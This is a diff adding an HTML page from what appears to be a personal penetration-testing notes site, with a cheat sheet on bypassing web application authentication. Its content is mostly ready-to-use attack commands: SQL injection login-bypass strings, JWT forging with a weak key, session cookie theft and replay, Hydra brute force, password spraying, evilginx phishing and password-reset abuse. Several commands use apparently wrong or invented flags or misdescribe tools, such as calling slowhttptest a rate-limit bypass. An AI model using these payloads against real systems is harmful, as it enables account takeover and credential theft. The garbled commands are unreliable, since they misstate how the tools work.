@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Web Application Authentication Bypass</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Web Application Authentication Bypass | Vault-Tec Terminal</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Web Application Authentication Bypass" />
+<meta name="author" content="RedTeamer403" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="RedTeamer403 Security Portfolio" />
+<meta property="og:description" content="RedTeamer403 Security Portfolio" />
+<link rel="canonical" href="http://localhost:4000/notes/web/auth/" />
+<meta property="og:url" content="http://localhost:4000/notes/web/auth/" />
+<meta property="og:site_name" content="Vault-Tec Terminal" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Web Application Authentication Bypass" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","author":{"@type":"Person","name":"RedTeamer403"},"description":"RedTeamer403 Security Portfolio","headline":"Web Application Authentication Bypass","url":"http://localhost:4000/notes/web/auth/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+  <div id="init-screen" class="init-screen">
+    <div class="init-content">
+      <div class="init-step">Initializing VAULT-TEC OS...</div>
+      <div class="init-step">Loading security protocols...</div>
+      <div class="init-step">Establishing secure connection...</div>
+      <div class="init-step">Connection established.</div>
+      <div class="init-step">SYSTEM READY</div>
+    </div>
+  </div>
+
+  <div id="main-content" class="main-content hidden">
+    <header>
+      <div class="container">
+        <h1>Vault-Tec Terminal</h1>
+        <nav>
+          <a href="/" >ABOUT</a>
+          <a href="/posts" >POSTS</a>
+          <a href="/notes" class="active">NOTES</a>
+          <a href="/tools" >TOOLS</a>
+        </nav>
+      </div>
+    </header>
+
+    <main class="container">
+      <div class="search-container">
+        <input type="text" class="search-input" placeholder="Search notes...">
+      </div>
+      <div class="notes-container">
+        <div class="notes-sidebar">
+          <div class="notes-category">
+            <h3>CheatSheets</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/cheat/curl/" >CURL</a>
+              <a href="/notes/cheat/DNS/" >DNS</a>
+              <a href="/notes/cheat/file/" >File Transfer</a>
+              <a href="/notes/cheat/hydra/" >Hydra</a>
+              <a href="/notes/cheat/john/" >JohnTheRipper</a>
+              <a href="/notes/cheat/ncat/" >NCAT</a>
+              <a href="/notes/cheat/nmap/" >NMAP</a>
+              <a href="/notes/cheat/shell/" >Reverse Shell</a>
+              <a href="/notes/cheat/wordlists/" >Wordlists</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Active Directory</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/ad/enum/" >Domain Enumeration</a>
+              <a href="/notes/ad/attack/" >Attack Vectors</a>
+              <a href="/notes/ad/persist/" >Persistence</a>
+              <a href="/notes/ad/lateral/" >Lateral Movement</a>
+            </div>
+          </div>
+          
+          <div class="notes-category">
+            <h3>Cloud</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/cloud/aws/" >AWS</a>
+              <a href="/notes/cloud/azure/" >Azure</a>
+              <a href="/notes/cloud/google/" >Google</a>
+              <a href="/notes/cloud/terra/" >Terraform</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Container</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/container/docker/" >Docker</a>
+              <a href="/notes/container/k8s/" >Kubernetes</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Linux</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/linux/checklist/" >Penetration Testing Checklist</a>
+              <a href="/notes/linux/enum/" >Enumeration</a>
+              <a href="/notes/linux/privesc/" >Privilege Escalation</a>
+              <a href="/notes/linux/post/" >Post Exploitation</a>
+              <a href="/notes/linux/services/" >Services</a>
+              <a href="/notes/linux/tools/" >Tools</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Network</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/network/exfil/" >Data Exfiltration</a>
+              <a href="/notes/network/scan/" >Port Scanning</a>
+              <a href="/notes/network/recon/" >Reconnaissance</a>
+              <a href="/notes/network/pivot/" >Pivoting</a>
+              <a href="/notes/network/services/" >Services</a>
+              <a href="/notes/network/sniff/" >Traffic Analysis</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Tech Stack</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/tech/cms/" >CMS</a>
+              <a href="/notes/tech/db/" >Databases</a>
+              <a href="/notes/tech/devops/" >DevOps</a>
+              <a href="/notes/tech/enterprise/" >Enterprise Apps</a>
+              <a href="/notes/tech/iam/" >IAM</a>
+              <a href="/notes/tech/mon/" >Monitoring</a>
+              <a href="/notes/tech/open/" >Open-Source</a>
+              <a href="/notes/tech/util/" >Utilities</a>
+              <a href="/notes/tech/server/" >Web Servers</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Windows</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/windows/av/" >AV/EDR Evasion</a>
+              <a href="/notes/windows/enum/" >Enumeration</a>
+              <a href="/notes/windows/privesc/" >Privilege Escalation</a>
+              <a href="/notes/windows/post/" >Post Exploitation</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Web Application</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/web/recon/" >Reconnaissance</a>
+              <a href="/notes/web/vulns/" >Common Vulnerabilities</a>
+              <a href="/notes/web/auth/" class="active">Authentication Bypass</a>
+              <a href="/notes/web/api/" >API Testing</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="notes-content">
+          <div id="search-results"></div>
+          <div id="note-content">
+            <h1 id="web-application-authentication-bypass">Web Application Authentication Bypass</h1>
+
+<h2 id="sql-login-bypass">SQL Login Bypass</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Test SQL injection</span>
+admin<span class="s1">' OR 1=1 --
+
+# Use UNION
+admin'</span> UNION SELECT 1, <span class="s1">'password'</span> <span class="nt">--</span>
+
+<span class="c"># Blind SQLi with sleep</span>
+admin<span class="s1">' AND SLEEP(5) --
+
+# Automate with sqlmap
+sqlmap -u http://example.com/login --data="user=admin&amp;pass=test" --level=3
+</span></code></pre></div></div>
+
+<h2 id="token-manipulation">Token Manipulation</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Decode JWT</span>
+jwt_tool &lt;token&gt;
+
+<span class="c"># Modify JWT payload</span>
+<span class="nb">echo</span> <span class="s1">'{"user":"admin"}'</span> | <span class="nb">base64</span> <span class="o">&gt;</span> payload.b64
+
+<span class="c"># Sign with weak key</span>
+jwt <span class="nt">-S</span> HS256 <span class="nt">-s</span> <span class="s2">"weakkey"</span> <span class="nt">-p</span> payload.b64 <span class="nt">-o</span> newtoken.jwt
+
+<span class="c"># Test signature bypass</span>
+curl <span class="nt">-H</span> <span class="s2">"Authorization: Bearer &lt;modified_token&gt;"</span> http://example.com
+</code></pre></div></div>
+
+<h2 id="session-hijacking">Session Hijacking</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Steal session cookie</span>
+document.cookie
+
+<span class="c"># Use Burp to capture</span>
+
+<span class="c"># Inject cookie</span>
+curl <span class="nt">-b</span> <span class="s2">"session=stolen_cookie"</span> http://example.com
+
+<span class="c"># Automate with evilginx</span>
+evilginx <span class="nt">-u</span> http://example.com <span class="nt">-o</span> cookies.txt
+</code></pre></div></div>
+
+<h2 id="brute-force">Brute Force</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Brute-force with Hydra</span>
+hydra <span class="nt">-l</span> admin <span class="nt">-P</span> wordlist.txt http://example.com/login <span class="nt">-f</span>
+
+<span class="c"># Use Burp Intruder</span>
+
+<span class="c"># Password spraying</span>
+crackmapexec http &lt;target&gt; <span class="nt">-u</span> users.txt <span class="nt">-p</span> passwords.txt
+
+<span class="c"># Rate-limit bypass</span>
+slowhttptest <span class="nt">-c</span> 1000 <span class="nt">-H</span> <span class="nt">-g</span> <span class="nt">-o</span> status_code <span class="nt">-u</span> http://example.com
+</code></pre></div></div>
+
+<h2 id="other-techniques">Other Techniques</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Weak Password Reset</span>
+curl <span class="s2">"http://example.com/reset?token=1234&amp;newpass=admin"</span>
+
+<span class="c"># CAPTCHA Bypass</span>
+curl <span class="nt">-d</span> <span class="s2">"captcha=guess"</span> http://example.com/login
+
+<span class="c"># Default Credentials</span>
+admin:admin
+admin:password
+
+<span class="c"># Logic Flaws</span>
+curl <span class="s2">"http://example.com/change?user=admin&amp;newrole=admin"</span>
+</code></pre></div></div>
+
+<h2 id="tools">Tools</h2>
+<ul>
+  <li>sqlmap: <code class="language-bash highlighter-rouge">sqlmap <span class="nt">-u</span> http://example.com</code></li>
+  <li>jwt_tool: <code class="language-bash highlighter-rouge">jwt_tool &lt;token&gt;</code></li>
+  <li>Hydra: <code class="language-bash highlighter-rouge">hydra <span class="nt">-l</span> &lt;user&gt; <span class="nt">-P</span> &lt;wordlist&gt; &lt;target&gt;</code></li>
+  <li>evilginx: <code class="language-bash highlighter-rouge">evilginx <span class="nt">-u</span> http://example.com</code></li>
+  <li>CrackMapExec: <code class="language-bash highlighter-rouge">crackmapexec http &lt;target&gt; <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> &lt;pass&gt;</code></li>
+  <li>OWASP ZAP: <code class="language-bash highlighter-rouge">zap-cli <span class="nt">-t</span> http://example.com</code></li>
+  <li>slowhttptest: <code class="language-bash highlighter-rouge">slowhttptest <span class="nt">-u</span> http://example.com</code></li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <div class="system-info">
+      <div class="terminal-time"></div>
+      <div class="location-info"></div>
+    </div>
+  </div>
+
+  <script src="/assets/js/main.js"></script>
+</body>
+</html>
